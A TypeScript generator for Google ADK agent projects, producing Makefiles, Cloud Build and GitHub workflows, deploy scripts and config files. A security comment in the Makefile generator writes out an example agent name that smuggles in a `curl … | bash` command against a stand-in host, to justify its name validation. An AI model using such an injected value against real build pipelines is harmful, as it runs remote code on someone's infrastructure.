import {
  AdkAgentConfig,
  cloudRunAccessCommentBlock,
  cloudRunAccessFlags,
  cloudRunAccessLabel,
} from "./types";
import { assertValidGcpResourceName } from "../shellSafety";
import { toCloudRunServiceName } from "./agentName";

/**
 * Region used by the generated `make deploy-cloud-run` recipe. It was already
 * hardcoded to us-central1 here; it is now a named constant so the access-mode
 * guidance can quote the same value in its `add-iam-policy-binding` example.
 */
const CLOUD_RUN_DEPLOY_REGION = "us-central1";

export const generateTestConfigJson = (config: AdkAgentConfig): string => {
  return JSON.stringify(
    {
      criteria: {
        tool_trajectory_avg_score: 1.0,
        final_response_match_v2: 0.8,
        hallucinations_v1: 0.0,
        rubric_based_final_response_quality_v1: {
          threshold: 0.8,
          rubrics: [
            {
              rubric_id: "safety",
              rubric_content: {
                text_property:
                  "The agent must NOT reveal sensitive internal details or credentials.",
              },
            },
            {
              rubric_id: "helpfulness",
              rubric_content: {
                text_property:
                  "The response must directly answer the user's question.",
              },
            },
          ],
        },
      },
    },
    null,
    2,
  );
};

export const generateEvalSetJson = (config: AdkAgentConfig): string => {
  return JSON.stringify(
    {
      eval_set_id: "basic_eval_set",
      eval_cases: [
        {
          eval_id: "case_01_hello",
          description: "Basic greeting check",
          conversation: [
            {
              user_content: {
                role: "user",
                parts: [{ text: "Hello, who are you?" }]
              },
              final_response: {
                role: "model",
                parts: [{ text: "I am an intelligent agent." }], // Relaxed match
              },
            },
          ],
          session_input: {
            app_name: "app", // Standard ADK app name
            user_id: "test_user_1",
            state: {},
          },
        },
      ],
    },
    null,
    2,
  );
};

export const generateMakefile = (config: AdkAgentConfig): string => {
  const deployTarget =
    config.deploymentTarget === "agent_engine"
      ? "deploy-agent-engine"
      : "deploy-cloud-run";
  // SECURITY (F-01): `config.name` becomes the Cloud Run service name in the
  // `gcloud run deploy` line below, and the generated cloudbuild.yaml runs this
  // Makefile from a `bash -c` step (`make deploy`). A name such as
  // `x; curl https://untrusted.example.com/s.sh | bash; #` would therefore execute in
  // Cloud Build. Validate the derived name against the GCP resource-name
  // allowlist -- every name Cloud Run would actually accept already passes.
  // An empty name means the builder form is not filled in yet (this template is
  // regenerated on every keystroke), so only a non-empty name is checked.
  //
  // toCloudRunServiceName lowercases as well as replacing underscores: ADK
  // allows uppercase in the Python identifier but a Cloud Run service name is a
  // DNS label and cannot contain it.
  const cloudRunServiceName = toCloudRunServiceName(config.name);
  if (cloudRunServiceName) {
    assertValidGcpResourceName(cloudRunServiceName, "Agent name");
  }
  // SECURITY (2.7): this line used to hardcode `--allow-unauthenticated`, so
  // every agent built here was reachable by the whole internet and the user was
  // never asked. The flags now follow the access mode, which defaults to
  // IAM-only. `cloudRunAccessFlags` never throws -- this generator runs on the
  // Agent Builder render path.
  const accessFlags = cloudRunAccessFlags(config.cloudRunAccess);
  const accessNotes = cloudRunAccessCommentBlock(config.cloudRunAccess, {
    serviceName: cloudRunServiceName || "SERVICE_NAME",
    region: CLOUD_RUN_DEPLOY_REGION,
  });
  return `# ADK Makefile
SHELL := /bin/bash

# Default target
.PHONY: all
all: install test

# Install dependencies
.PHONY: install
install:
	pip install -r app/requirements.txt

# Run unit tests and evaluation
.PHONY: test
test:
	# Run unit tests if they exist
	if [ -d "tests/unit" ]; then pytest tests/unit; fi
	# Run evaluation
	adk eval ./app tests/eval/evalsets/basic.evalset.json --config_file_path=tests/eval/test_config.json

# Deploy
.PHONY: deploy
deploy: ${deployTarget}

.PHONY: deploy-agent-engine
deploy-agent-engine:
	@echo "Deploying to Agent Engine..."
	python -m app.deploy_re

# Cloud Run access mode: ${cloudRunAccessLabel(config.cloudRunAccess)}
${accessNotes}
.PHONY: deploy-cloud-run
deploy-cloud-run:
	@echo "Deploying to Cloud Run (${cloudRunAccessLabel(config.cloudRunAccess)})..."
	gcloud run deploy ${cloudRunServiceName} --source . --region ${CLOUD_RUN_DEPLOY_REGION} ${accessFlags}
`;
};

export const generateCloudBuildYaml = (
  config: AdkAgentConfig,
  projectId: string,
): string => {
  // SECURITY (F-01): the two `bash -c` steps below interpolate nothing directly,
  // but the second one runs `make deploy`, and the generated Makefile splices the
  // agent name into `gcloud run deploy`. Validate here as well so this pipeline
  // cannot be generated for a name that would execute commands in Cloud Build.
  // Empty is exempt for the same reason as in generateMakefile: the builder
  // regenerates this preview on every keystroke, starting from an empty name.
  // `projectId` is deliberately NOT validated -- it is not interpolated into this
  // template at all, and legacy domain-scoped IDs ("example.com:proj") would fail
  // the allowlist for no security benefit.
  if (config.name && config.name.trim()) {
    assertValidGcpResourceName(toCloudRunServiceName(config.name), "Agent name");
  }
  return `steps:
  # Install dependencies and run evaluation
  - name: 'python:3.11'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        pip install -r app/requirements.txt
        adk eval ./app tests/eval/evalsets/basic.evalset.json --config_file_path=tests/eval/test_config.json

  # Deploy using unified Google Cloud CLI with Python environment
  - name: 'gcr.io/google.com/cloudsdktool/google-cloud-cli:latest'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        python3 -m pip install -r app/requirements.txt
        make deploy

timeout: '1200s'

options:
  logging: CLOUD_LOGGING_ONLY`;
};

export const generateGithubWorkflow = (config: AdkAgentConfig): string => {
  return `name: Deploy Agent (Reusable Template)

on:
  workflow_call:
    inputs:
      service_account:
        description: 'Service Account email for GCP deployment'
        required: true
        type: string
      gemini_app_id:
        description: 'Gemini Enterprise App ID for automatic publishing'
        required: false
        type: string
    secrets:
      wif_provider:
        description: 'Workload Identity Federation Provider ID'
        required: true

jobs:
  test-and-deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: 'read'
      id-token: 'write'

    steps:
    - uses: actions/checkout@v4

    - id: 'auth'
      uses: 'google-github-actions/auth@v2'
      with:
        workload_identity_provider: '\${{ secrets.wif_provider }}'
        service_account: '\${{ inputs.service_account }}'

    - name: Set up Cloud SDK
      uses: 'google-github-actions/setup-gcloud@v2'

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install uv and dependencies
      run: |
        pip install uv==0.8.13
        uv venv
        uv pip install -r app/requirements.txt

    - name: Run Evaluation
      run: |
        uv run adk eval ./app tests/eval/evalsets/basic.evalset.json --config_file_path=tests/eval/test_config.json

    - name: Deploy
      if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
      env:
        DISCOVERY_ENGINE_ENGINE_ID: \${{ inputs.gemini_app_id }}
      run: |
        uv run make deploy
`;
};

export const generateCallerGithubWorkflow = (
  config: AdkAgentConfig,
  templatePath: string,
  geminiAppId?: string,
): string => {
  const resolvedTemplatePath = (templatePath && (templatePath.includes(".yaml") || templatePath.includes(".yml") || templatePath.includes("/")))
    ? templatePath
    : (templatePath ? `${templatePath}/agent-templates/.github/workflows/deploy.yaml@main` : "./.github/workflows/deploy.yaml");

  let withSection = `      service_account: "${config.githubServiceAccount || "my-service-account@my-project.iam.gserviceaccount.com"}"`;
  if (geminiAppId) {
    withSection += `\n      gemini_app_id: "${geminiAppId}"`;
  }

  return `name: Deploy Using Shared Template

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  call-deployment-template:
    uses: ${resolvedTemplatePath}
    permissions:
      contents: 'read'
      id-token: 'write'
    with:
${withSection}
    secrets:
      wif_provider: \${{ secrets.GCP_WIF_PROVIDER }}
`;
};

export const generateTestConfig = (): string => {
  return JSON.stringify(
    {
      criteria: {
        tool_trajectory_avg_score: 1.0,
        response_match_score: 0.8,
      },
    },
    null,
    2,
  );
};

export const generateEvalSet = (): string => {
  return JSON.stringify(
    {
      eval_set_id: "basic",
      eval_cases: [
        {
          eval_id: "test_1",
          conversation: [
            {
              user_content: { parts: [{ text: "Hello" }] },
              final_response: {
                role: "model",
                parts: [{ text: "Hello! How can I help you today?" }],
              },
            },
          ],
          session_input: { app_name: "app", user_id: "evaluator", state: {} },
        },
      ],
    },
    null,
    2,
  );
};

export const generateDesignSpec = (config: AdkAgentConfig): string => {
  return `# DESIGN_SPEC.md

## Overview
${config.description}

## Example Use Cases
1. **User**: "Hello"
   **Agent**: "Hello! How can I help you today?"

## Tools Required
${config.tools.map((t) => `- ${t.variableName} (${t.type})`).join("\n")}

## Constraints & Safety Rules
- The agent must strictly follow the system instructions.
- Do not hallucinate capabilities not provided by tools.
`;
};

export const generateLaunchScript = (config: AdkAgentConfig): string => {
  return `#!/bin/bash

# Ensure we are in the script's directory or project root
cd "$(dirname "$0")/.."

# Check if adk is in the path
if ! command -v adk &> /dev/null; then
    # Try to find it in the common venv locations
    if [ -f "../../.venv/bin/adk" ]; then
        export PATH="../../.venv/bin:$PATH"
    elif [ -f ".venv/bin/adk" ]; then
        export PATH=".venv/bin:$PATH"
    else
        echo "WARNING: 'adk' command not found in PATH or standard venv locations."
        echo "Please ensure you have activated your virtual environment."
    fi
fi

# Get the access token from gcloud
echo "Fetching GCP access token..."
TOKEN=$(gcloud auth print-access-token)

if [ -z "$TOKEN" ]; then
    echo "Error: Failed to get access token. Please run 'gcloud auth login' first."
    exit 1
fi

# Load AUTH_ID from .env or app/.env if present
ENV_FILE=""
if [ -f .env ]; then
    ENV_FILE=".env"
elif [ -f app/.env ]; then
    ENV_FILE="app/.env"
fi

if [ -n "$ENV_FILE" ]; then
    # Grep AUTH_ID, remove quotes if any
    ENV_AUTH_ID=$(grep -E '^[[:space:]]*AUTH_ID[[:space:]]*=' "$ENV_FILE" | sed -E 's/^[[:space:]]*AUTH_ID[[:space:]]*=[[:space:]]*//' | sed -e 's/[[:space:]]*$//' -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")
else
    echo "No .env file found in root or app directory."
fi

if [ -z "$ENV_AUTH_ID" ]; then
    echo "No AUTH_ID found in .env, defaulting to GCP_ACCESS_TOKEN"
    export AUTH_ID="GCP_ACCESS_TOKEN"
    export GCP_ACCESS_TOKEN="$TOKEN"
else
    echo "Exporting token to environment variable: $ENV_AUTH_ID"
    export "$ENV_AUTH_ID"="$TOKEN"
fi

echo "Launching ADK Web from the agent root directory..."
adk web
`;
};

export const generateAdkDeployBashWrapper = (): string => `#!/usr/bin/env bash
set -e

# Deploy script runner for Vertex AI Agent Engine
SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

if [ -f "deploy_re.py" ]; then
    exec python3 deploy_re.py "$@"
elif [ -f "app/deploy_re.py" ]; then
    exec python3 -m app.deploy_re "$@"
else
    echo "Error: deploy_re.py not found." >&2
    exit 1
fi
`;

export const generateAdkDeployScript = (config: AdkAgentConfig): string => {
  if (config.adkVersion === "2.2") {
    return `#!/usr/bin/env python3
import os
import sys
import asyncio
import logging
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Parse .env if it exists
try:
    env_path = ".env" if os.path.exists(".env") else "app/.env"
    if os.path.exists(env_path):
        with open(env_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    key = line.split("=")[0].strip()
                    value = line.split("=", 1)[1].strip().strip("\\"'") if "=" in line else ""
                    os.environ[key] = value
except Exception as e:
    logger.warning(f"Failed to parse .env file: {e}")

try:
    from app.agent import root_agent
except ImportError:
    try:
        from agent import root_agent
    except ImportError:
        logger.error("Could not import root_agent from app.agent or agent.")
        sys.exit(1)

async def run_agent_test():
    logger.info("Initializing Google Antigravity Agent (ADK 2.2)...")
    project_id = os.getenv("GOOGLE_CLOUD_PROJECT")
    logger.info(f"Connected to GCP Project: {project_id}")
    
    agent_display_name = os.getenv("AGENT_DISPLAY_NAME", "${config.name || "my-agent"}")
    logger.info(f"Agent '{agent_display_name}' verified and ready.")
    
    test_prompt = sys.argv[1] if len(sys.argv) > 1 else "Hello! Are you ready?"
    logger.info(f"Running agent verification with prompt: {test_prompt}")
    
    async with root_agent as active_agent:
        response = await active_agent.chat(test_prompt)
        print(f"\\n--- Antigravity Agent Response ---")
        if hasattr(response, "text"):
            text = await response.text() if asyncio.iscoroutinefunction(response.text) else response.text()
            print(text)
        else:
            print(str(response))
        print("----------------------------------\\n")

def main():
    logger.info("Starting Antigravity AGY Agent Runner...")
    asyncio.run(run_agent_test())
    logger.info("Antigravity Agent Execution Completed Successfully.")

if __name__ == "__main__":
    main()
`;
  }

  return `#!/usr/bin/env python3
import os
import sys
import logging
import vertexai
from vertexai import agent_engines

try:
    from vertexai.preview import reasoning_engines
except ImportError:
    pass

try:
    from app.app import app as app_to_deploy
except ImportError:
    try:
        from app import app as app_to_deploy
    except ImportError:
        try:
            from agent import root_agent as app_to_deploy
        except ImportError:
            from app.agent import root_agent as app_to_deploy

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Parse .env if it exists
env_vars = []
reqs = []
try:
    req_path = "requirements.txt" if os.path.exists("requirements.txt") else "app/requirements.txt"
    if os.path.exists(req_path):
        with open(req_path, "r") as f:
            reqs = [
                ("mcp>=1.24.0,<2.0.0" if line.strip() == "mcp" else line.strip())
                for line in f if line.strip() and not line.startswith("#")
            ]

    env_path = ".env" if os.path.exists(".env") else "app/.env"
    if os.path.exists(env_path):
        with open(env_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    key = line.split("=")[0].strip()
                    value = line.split("=", 1)[1].strip().strip("\\"'") if "=" in line else ""
                    os.environ[key] = value
                    # Append strictly non-reserved keys to env_vars list for deployment
                    # We explicitly allow GOOGLE_CLOUD_LOCATION to pass into the container
                    # to specify the model endpoint location (e.g. 'global' for Gemini 3).
                    # WARNING: Vertex AI will reject payloads holding empty string values, so we filter out those cases here.
                    if value and (key not in ["GOOGLE_CLOUD_PROJECT", "STAGING_BUCKET", "PROJECT_ID", "DEPLOYMENT_LOCATION"]
                        and not key.startswith("GOOGLE_CLOUD_AGENT_ENGINE_")):
                        env_vars.append(key)

        # Deduplicate env_vars to prevent "EnvVar names must be unique" error
        env_vars = list(set(env_vars))
        logger.info(f"Final deployment env_vars: {env_vars}")
        logger.info(f"Parsed {len(env_vars)} environment variables for deploymentSpec.")
except Exception as e:
    logger.warning(f"Failed to parse .env file: {e}")

project_id = os.getenv("GOOGLE_CLOUD_PROJECT")
# OVERRIDE: The Vertex AI Agent Engine deployer requires the SDK to point to the region
# where the Agent Engine itself will live (e.g. us-central1). They CANNOT be deployed to 'locations/global'.
# However, we passed 'global' into GOOGLE_CLOUD_LOCATION via the .env file so the model uses the global endpoint.
# We MUST use DEPLOYMENT_LOCATION for the SDK init, defaulting to a regional location like us-central1.
deployment_location = os.getenv("DEPLOYMENT_LOCATION") or os.getenv("REGION")
if not deployment_location or deployment_location == "global":
    deployment_location = "us-central1"
location = deployment_location
staging_bucket = os.getenv("STAGING_BUCKET")

logger.info(f"Initializing Vertex AI: project={project_id}, location={location}, staging_bucket={staging_bucket}")
# WARNING: We must momentarily overwrite the environment so 'vertexai.init' connects to the correct regional registry pipeline.
original_os_location = os.environ.get("GOOGLE_CLOUD_LOCATION")
if location is not None:
    os.environ["GOOGLE_CLOUD_LOCATION"] = location
vertexai.init(project=project_id, location=location, staging_bucket=staging_bucket)

if original_os_location is not None:
    os.environ["GOOGLE_CLOUD_LOCATION"] = original_os_location
elif "GOOGLE_CLOUD_LOCATION" in os.environ:
    del os.environ["GOOGLE_CLOUD_LOCATION"]

logger.info("Creating Agent Engine...")
${config.enableGraphvizRendering ? `
# Write graphviz installation script dynamically so it gets packaged
os.makedirs("installation_scripts", exist_ok=True)
with open("installation_scripts/install_graphviz.sh", "w") as f:
    f.write("#!/bin/bash\\napt-get update && apt-get install -y graphviz\\n")
` : ""}
# Detect extra packages
extra_packages = []
for f in os.listdir("."):
    if f in ["deploy_re.py", ".env", "requirements.txt", ".git", ".adk", "venv", ".venv", "__pycache__", "node_modules"]:
        continue

    if os.path.isfile(f) and f.endswith(".py"):
            extra_packages.append(f)
    elif os.path.isdir(f) and not f.startswith("."):
            extra_packages.append(f)

logger.info(f"Extra packages detected: {extra_packages}")

agent_display_name = os.getenv("AGENT_DISPLAY_NAME", "${config.name || "my-agent"}")

try:
    logger.info(f"Checking for existing agent with display name '{agent_display_name}'...")
    existing_agents = agent_engines.list()
    
    target_agent = None
    for agent in existing_agents:
        if agent.display_name == agent_display_name:
            target_agent = agent
            break
            
    if target_agent:
        logger.info(f"Found existing agent: {target_agent.name}. Updating...")
        remote_app = agent_engines.update(
            target_agent.name,
            agent_engine=app_to_deploy,
            requirements=reqs,
            env_vars=env_vars,
            extra_packages=extra_packages,${config.enableGraphvizRendering
      ? `
            build_options={"installation_scripts": ["installation_scripts/install_graphviz.sh"]},`
      : ""
    }
        )
        logger.info("Update Succeeded!")
    else:
        logger.info("No existing agent found. Creating new...")
        remote_app = agent_engines.create(
            agent_engine=app_to_deploy,
            display_name=agent_display_name,
            requirements=reqs,
            env_vars=env_vars,
            extra_packages=extra_packages,${config.enableGraphvizRendering
      ? `
            build_options={"installation_scripts": ["installation_scripts/install_graphviz.sh"]},`
      : ""
    }
        )
        logger.info("Deployment Succeeded!")
        
    print(f"Deployment finished!")
    print(f"Resource Name: {remote_app.resource_name}")
${config.enableDiscoveryApi
      ? `
    logger.info("Auto-registering Agent to Gemini Enterprise (Discovery Engine)...")
    import requests
    import google.auth
    from google.auth.transport.requests import Request
    
    disc_project = os.getenv("DISCOVERY_ENGINE_PROJECT_ID", project_id)
    disc_location = os.getenv("DISCOVERY_ENGINE_LOCATION", "global")
    disc_collection = os.getenv("DISCOVERY_ENGINE_COLLECTION", "default_collection")
    disc_engine = os.getenv("DISCOVERY_ENGINE_ENGINE_ID")
    
    if disc_engine:
        logger.info(f"Using Discovery Engine: {disc_engine}")
        credentials, _ = google.auth.default(scopes=["https://www.googleapis.com/auth/cloud-platform"])
        credentials.refresh(Request())
        
        # Note: If target_agent is True, the agent might already be registered. 
        # For simplicity, we fire the POST and let it fail with 409 Conflict if it already exists,
        # or we could list first. 
        # We'll just try to create it.
        api_url = f"https://discoveryengine.googleapis.com/v1alpha/projects/{disc_project}/locations/{disc_location}/collections/{disc_collection}/engines/{disc_engine}/assistants/default_assistant/agents"
        
        auth_config = {}
        if os.getenv("AUTH_ID"):
            auth_config = {
                "toolAuthorizations": [
                    f"projects/{disc_project}/locations/global/authorizations/{os.getenv('AUTH_ID')}"
                ]
            }

        payload = {
            "displayName": agent_display_name,
            "description": ${JSON.stringify(config.description || "")},
            "adkAgentDefinition": {
                "toolSettings": {
                    "toolDescription": f"[Agent Metadata]\\nCreated By: Automated CI/CD\\nAgent Engine: {remote_app.resource_name}\\nAdditional Info: None"
                },
                "provisionedReasoningEngine": {
                    "reasoningEngine": remote_app.resource_name
                }
            }
        }
        
        if auth_config:
            payload["authorizationConfig"] = auth_config
        
        headers = {
            "Authorization": f"Bearer {credentials.token}",
            "Content-Type": "application/json",
            "X-Goog-User-Project": disc_project
        }
        
        # Check if Agent already exists in Discovery Engine
        logger.info("Checking if Agent exists in Gemini Enterprise...")
        list_res = requests.get(api_url, headers=headers)
        if list_res.status_code == 200:
            existing_disc_agents = list_res.json().get('agents', [])
            auth_filter = auth_config.get("toolAuthorizations", [""])[0] if auth_config else None
            
            disc_agent = None
            for a in existing_disc_agents:
                # 1. Match by Display Name (Direct Match)
                if a.get('displayName') == agent_display_name:
                    disc_agent = a
                    break
                # 2. Match by Auth Binding (Implicit Update when renaming via GitHub)
                if auth_filter and auth_filter in str(a.get('authorizationConfig', {})):
                    disc_agent = a
                    break
            
            if disc_agent:
                logger.info(f"Agent found in Gemini Enterprise: {disc_agent['name']}. Updating...")
                patch_url = f"https://discoveryengine.googleapis.com/v1alpha/{disc_agent['name']}?updateMask=description,adkAgentDefinition,authorizationConfig"
                patch_res = requests.patch(patch_url, headers=headers, json=payload)
                if patch_res.status_code == 200:
                    logger.info("Successfully updated agent in Gemini Enterprise!")
                else:
                    logger.warning(f"Update failed ({patch_res.status_code}): {patch_res.text}")
            else:
                logger.info("Agent not found in Gemini Enterprise. Creating...")
                post_res = requests.post(api_url, headers=headers, json=payload)
                if post_res.status_code == 200:
                    logger.info("Successfully registered in Gemini Enterprise!")
                else:
                    logger.warning(f"Registration failed ({post_res.status_code}): {post_res.text}")
        else:
            logger.warning(f"Failed to list agents in Discovery Engine ({list_res.status_code}): {list_res.text}")
            logger.info("Attempting blind Registration POST request...")
            post_res = requests.post(api_url, headers=headers, json=payload)
            if post_res.status_code == 200:
                logger.info("Successfully registered in Gemini Enterprise!")
            else:
                logger.warning(f"Registration failed ({post_res.status_code}): {post_res.text}")
`
      : ""
    }
except Exception as e:
    logger.error(f"Deployment/Update Failed: {e}")
    raise
`.trim();
};

export const generateAdkEnvFile = (
  config: AdkAgentConfig,
  projectNumber: string,
  location: string,
  stagingBucket: string,
): string => {
  const isGlobalModel =
    config.model?.startsWith("gemini-3") ||
    config.model?.includes("3.5") ||
    config.model?.includes("latest");
  const modelLocation = isGlobalModel ? "global" : location;
  const deploymentLocation =
    !location || location === "global" ? "us-central1" : location;
  let env = `GOOGLE_CLOUD_PROJECT="${projectNumber}"
GOOGLE_CLOUD_LOCATION="${modelLocation}"
DEPLOYMENT_LOCATION="${deploymentLocation}"
STAGING_BUCKET="${stagingBucket}"
GOOGLE_GENAI_USE_VERTEXAI="true"
ENABLE_A2A="true"`;

  if (config.model) {
    env += `\nMODEL="${config.model}"`;
  }

  if (config.enableThinking) {
    if (isGlobalModel && !config.model?.includes("latest")) {
      env += `\nTHINKING_LEVEL="${config.thinkingLevel || "HIGH"}"`;
    } else {
      env += `\nTHINKING_BUDGET="${config.thinkingBudget || 1024}"`;
    }
  }

  if (config.enableOAuth && config.authId) {
    env += `\nAUTH_ID="${config.authId}"`;
  }

  if (config.enableTelemetry) {
    env += `\nGOOGLE_CLOUD_AGENT_ENGINE_ENABLE_TELEMETRY="true"`;
  }

  // Always disable JSON schema serialization for function declarations to keep prompt token size minimal and prevent API crashes.
  env += `\nADK_DISABLE_JSON_SCHEMA_FOR_FUNC_DECL="1"`;

  if (config.enableMessageLogging) {
    env += `\nOTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT="true"`;
  }

  if (config.enableDiscoveryApi) {
    env += `\n
# Discovery Engine
DISCOVERY_ENGINE_PROJECT_ID="${config.discoveryConfig.projectId || projectNumber}"
DISCOVERY_ENGINE_LOCATION="${config.discoveryConfig.location || "global"}"
DISCOVERY_ENGINE_COLLECTION="${config.discoveryConfig.collection || "default_collection"}"
DISCOVERY_ENGINE_ENGINE_ID="${config.discoveryConfig.engineId || "your-engine-id"}"
DISCOVERY_ENGINE_DATA_STORE_IDS="${config.discoveryConfig.dataStoreIds || ""}"`;
  }

  if (config.enableBigQueryMcp) {
    env += `\n
# BigQuery
BQ_USER_PROJECT="${projectNumber}"`;
  }

  if (config.customMcpEndpoints && config.customMcpEndpoints.length > 0) {
    env += `\n\n# Custom MCP Endpoints`;
    config.customMcpEndpoints.forEach((ep) => {
      if (ep.name && ep.url) {
        const envKey = `MCP_SERVER_${ep.name.toUpperCase().replace(/[^A-Z0-9_]/g, "_")}_URL`;
        env += `\n${envKey}="${ep.url}"`;
      }
    });
  }

  return env;
};

export const generateAdkRequirementsFile = (config: AdkAgentConfig): string => {
  const isV2 = config.adkVersion === "2.2";
  const defaultDeps = isV2
    ? [
      "google-antigravity==0.1.3",
      "pydantic>=2.0.0",
      "python-dotenv",
      "nest_asyncio",
      "requests",
      "httpx",
    ]
    : [
      "google-adk[eval]>=1.26.0",
      "google-cloud-aiplatform[adk,agent_engines]>=1.75.0",
      "python-dotenv",
      "nest_asyncio",
      "google-auth",
      "requests",
      "google-genai",
      "cloudpickle",
      "mcp>=1.24.0,<2.0.0",
      "httpx",
    ];

  if (config.enableOAuth) {
    defaultDeps.push("google-auth-oauthlib>=1.2.2", "google-api-python-client");
  }

  if (config.enableGraphvizRendering) {
    defaultDeps.push("google-cloud-storage");
  }

  if (config.enableBigQueryMcp) {
    defaultDeps.push("google-cloud-bigquery");
  }

  if (config.enableBqAnalytics) {
    if (!defaultDeps.includes("google-cloud-bigquery")) {
      defaultDeps.push("google-cloud-bigquery");
    }
    defaultDeps.push("google-cloud-bigquery-storage");
  }

  if (config.enableSecurityCommandCenterApi) {
    defaultDeps.push("google-cloud-securitycenter");
  }

  if (config.enableRecommenderApi) {
    defaultDeps.push("google-cloud-recommender", "google-cloud-run");
  }

  if (config.enableServiceHealthApi) {
    defaultDeps.push("google-cloud-servicehealth");
  }

  if (config.enableNetworkManagementApi) {
    defaultDeps.push("google-cloud-network-management");
  }

  if (config.enableEmailTool) {
    defaultDeps.push("markdown");
  }

  if (config.enableCloudLoggingApi) {
    defaultDeps.push("google-cloud-logging");
  }

  if (config.enableCloudMonitoringApi) {
    defaultDeps.push("google-cloud-monitoring");
  }

  if (config.enableCloudRunApi) {
    defaultDeps.push("google-cloud-run");
  }

  if (config.enableResourceManagerApi) {
    defaultDeps.push("google-cloud-resource-manager");
  }

  if (config.enableAdminActivityApi) {
    defaultDeps.push("google-cloud-logging");
  }

  if (config.enableDatabaseFleetApi) {
    // Uses google-api-python-client, already handled in enableOAuth, but ensuring it's there
    if (!defaultDeps.includes("google-api-python-client")) {
      defaultDeps.push("google-api-python-client");
    }
  }

  if (config.enableCodeExecution) {
    defaultDeps.push("networkx", "matplotlib", "pandas", "seaborn");
  }

  if (config.enableGraphvizRendering) {
    defaultDeps.push("graphviz");
  }

  // A2A clients usually need requests or aiohttp, already got requests.

  return defaultDeps.join("\n");
};

export const generateAdkReadmeFile = (config: AdkAgentConfig): string => {
  return `# ${config.name || "Custom Agent"}

## Setup
    1. Create a virtual environment: \`python3 -m venv venv && source venv/bin/activate\`
2. Install dependencies: \`pip install -r requirements.txt\`
3. Set environment variables in \`.env\`.

## Files
- \`app.py\`: The asynchronous sync wrapper and deployment entrypoint.
- \`agent.py\`: Defines the agent instruction, model, and tool bindings.
- \`.env\`: Local environment variables.
- \`requirements.txt\`: Python dependencies.
- \`auth.py\`: Common authentication utilities (if needed).
- \`tools.py\`: Tool definitions.
- \`__init__.py\`: Empty init file.

## Deployment
Run the deployment script to deploy the agent to Vertex AI Agent Engine:
\`\`\`bash
python deploy_re.py
\`\`\`

## Local Testing
To test your agent locally and interact with it in your browser, launch it using the generated wrapper script. This script automatically provisions your gcloud user credentials for local environment variables:
\`\`\`bash
chmod +x scripts/launch_local.sh
./scripts/launch_local.sh
\`\`\`

## CI/CD Pipeline Configuration
${config.enableCiCd ? (config.ciCdRunner === 'github_actions' ? `
This agent is configured with GitHub Actions.
1. Create a Workload Identity Pool and Provider in Google Cloud.
2. Grant the service account the required roles (e.g., roles/aiplatform.user, roles/run.developer, roles/iam.workloadIdentityUser).
3. The generated \`.github/workflows/deploy.yaml\` is pre-configured with your WIF Provider and Service Account.
4. Push to the \`main\` branch to trigger the pipeline automatically.` : config.ciCdRunner === 'google_cloud_build' ? `
This agent is configured with Google Cloud Build.
1. In the Google Cloud Console, navigate to Cloud Build > Triggers.
2. Create a new trigger targeting your repository's \`main\` branch.
3. Ensure the default Cloud Build Service Account has required permissions to deploy.
4. Push to the \`main\` branch to trigger the pipeline automatically.` : 'No CI/CD pipeline enabled.') : 'No CI/CD pipeline enabled.'}

## Google Cloud Managed MCP Tool IAM Requirements
If this agent invokes Google Cloud remote MCP servers (such as BigQuery at \`https://bigquery.googleapis.com/mcp\` or Cloud Logging at \`https://logging.googleapis.com/mcp\`):
- The calling identity (**end-user** under OAuth delegation, or the **runtime service account** under ADC) must have the **\`roles/mcp.toolUser\`** role (\`mcp.tools.call\`).
- In addition, the principal must possess standard service-level data permissions (e.g., \`roles/bigquery.dataViewer\` and \`roles/bigquery.jobUser\`).

\`\`\`bash
# Grant MCP Tool User role:
gcloud projects add-iam-policy-binding PROJECT_ID \\
  --member="user:USER_EMAIL" \\
  --role="roles/mcp.toolUser"
\`\`\`
`;
};
